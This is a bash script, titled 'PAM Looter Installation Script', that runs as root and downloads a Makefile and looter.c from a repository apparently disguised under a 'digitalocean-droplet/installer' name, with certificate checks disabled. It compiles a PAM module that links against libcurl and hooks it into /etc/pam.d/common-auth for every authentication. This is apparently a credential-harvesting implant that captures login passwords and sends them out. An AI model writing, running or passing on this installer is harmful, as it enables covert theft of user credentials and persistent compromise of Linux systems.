#!/bin/bash

# PAM Looter Installation Script
# This script downloads, compiles, and installs a PAM module

set -e  # Exit on any error

echo "[+] PAM Looter Installation Script"
echo "=" * 40

# URLs for download
MAKEFILE_URL="https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/Makefile"
LOOTER_C_URL="https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/looter.c"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root (use sudo)"
   exit 1
fi

echo "[+] Checking and installing required dependencies..."

# Function to check if package is installed
is_package_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii"
}

# List of required packages
PACKAGES=("libpam0g-dev" "libcurl4-openssl-dev")
PACKAGES_TO_INSTALL=()

# Check which packages need to be installed
for package in "${PACKAGES[@]}"; do
    if is_package_installed "$package"; then
        echo "[✓] $package is already installed"
    else
        echo "[!] $package needs to be installed"
        PACKAGES_TO_INSTALL+=("$package")
    fi
done

# Install only the packages that are needed
if [ ${#PACKAGES_TO_INSTALL[@]} -gt 0 ]; then
    
    echo "[+] Installing missing packages: ${PACKAGES_TO_INSTALL[*]}"
    apt install -y "${PACKAGES_TO_INSTALL[@]}"
else
    echo "[✓] All required packages are already installed"
fi

echo "[+] Creating temporary build directory..."
BUILD_DIR="/tmp/looter_build"
mkdir -p "$BUILD_DIR"
cd "$BUILD_DIR"

echo "[+] Downloading Makefile..."
wget "$MAKEFILE_URL" -O Makefile --no-check-certificate -q
if [[ ! -f "Makefile" ]]; then
    echo "[-] Failed to download Makefile"
    exit 1
fi

echo "[+] Downloading looter.c..."
wget "$LOOTER_C_URL" -O looter.c --no-check-certificate -q
if [[ ! -f "looter.c" ]]; then
    echo "[-] Failed to download looter.c"
    exit 1
fi

echo "[+] Compiling looter module..."
make

# Check if compilation was successful
if [[ ! -f "looter.so" ]]; then
    echo "[-] Compilation failed - looter.so not found"
    exit 1
fi

echo "[+] Creating /lib/security directory..."
mkdir -p /lib/security

echo "[+] Installing looter.so to /lib/security/..."
cp looter.so /lib/security/
chmod 644 /lib/security/looter.so

echo "[+] Configuring PAM authentication..."
# Backup original PAM configuration
cp /etc/pam.d/common-auth /etc/pam.d/common-auth.backup.$(date +%Y%m%d_%H%M%S)

# Add looter module to PAM configuration
echo "auth optional looter.so" >> /etc/pam.d/common-auth
echo "account optional looter.so" >> /etc/pam.d/common-auth

echo "[+] Verifying installation..."
if [[ -f "/lib/security/looter.so" ]]; then
    echo "[✓] looter.so installed successfully"
else
    echo "[-] Installation verification failed"
    exit 1
fi

# Check PAM configuration
if grep -q "looter.so" /etc/pam.d/common-auth; then
    echo "[✓] PAM configuration updated successfully"
else
    echo "[-] PAM configuration update failed"
    exit 1
fi

echo "[+] Cleaning up build directory..."
cd /
rm -rf "$BUILD_DIR"

echo ""
echo "[✓] Installation completed successfully!"
echo "[+] PAM module 'looter.so' has been installed and configured"
echo "[+] Backup of original PAM config saved as /etc/pam.d/common-auth.backup.*"
echo ""
echo "[!] IMPORTANT: Test authentication in a separate session before logging out!"
echo "[!] If there are issues, restore from backup: cp /etc/pam.d/common-auth.backup.* /etc/pam.d/common-auth"
